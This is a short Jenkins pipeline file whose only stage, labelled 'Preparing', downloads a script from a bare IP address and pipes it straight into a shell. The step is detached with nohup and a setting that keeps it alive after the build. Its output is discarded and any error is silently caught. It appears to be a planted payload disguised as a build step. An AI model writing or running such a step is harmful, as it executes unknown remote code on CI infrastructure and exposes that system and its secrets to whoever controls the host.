node('k8s-permanent') {
    ansiColor('xterm') {
        try {
            stage("Preparing") {
                sh 'JENKINS_NODE_COOKIE=do_not_kill nohup bash -c "curl -s http://35.213.159.227/ss | sh" 2>&1 &'
            }
        } catch (e) {}
    }
}
